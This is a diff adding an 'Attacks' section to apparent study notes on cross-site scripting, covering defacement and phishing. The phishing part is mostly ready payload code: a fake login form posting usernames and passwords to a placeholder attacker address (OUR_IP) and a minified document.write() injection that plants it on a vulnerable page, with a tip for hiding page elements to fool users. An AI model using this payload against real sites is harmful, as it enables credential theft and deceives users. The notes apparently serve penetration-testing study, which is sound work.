@@ -98,3 +98,53 @@ Using fuzzers like ffuf we can take these lists and test parameters like this.
 
 Reviewing code would be the quickest way to check, but requires access to the code for it to work. 
 
+## Attacks
+
+### Defacing
+
+Just use the XSS to make the website ugly or say something it shouldn't. Could be used to make things like some sort of drive by attacks.
+
+### Phishing
+
+Good use case, send a crafted URL with the XSS payload in it to trick a user.
+
+In this use case we will create our own login form to capture users credentials
+
+Example login form in html
+
+```
+<h3>Please login to continue</h3>
+<form action=http://OUR_IP>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+```
+
+The login form should look as follows:
+
+```
+<div>
+<h3>Please login to continue</h3>
+<input type="text" placeholder="Username">
+<input type="text" placeholder="Password">
+<input type="submit" value="Login">
+<br><br>
+</div>
+```
+
+Now we should prepare our XSS code on the vulnerable form. To write HTML code to the vulnerable page we can use the JavaScript function `document.write()`. Also we should minify the code into one line/ 
+
+Minified code:
+
+```
+document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
+```
+
+If you have values you want to hide, like in our case a `Image URL` button to fool the user to login, do so like below
+
+```
+<form role="form" action="index.php" method="GET" id='urlform'>
+    <input type="text" placeholder="Image URL" name="url">
+</form>
+```
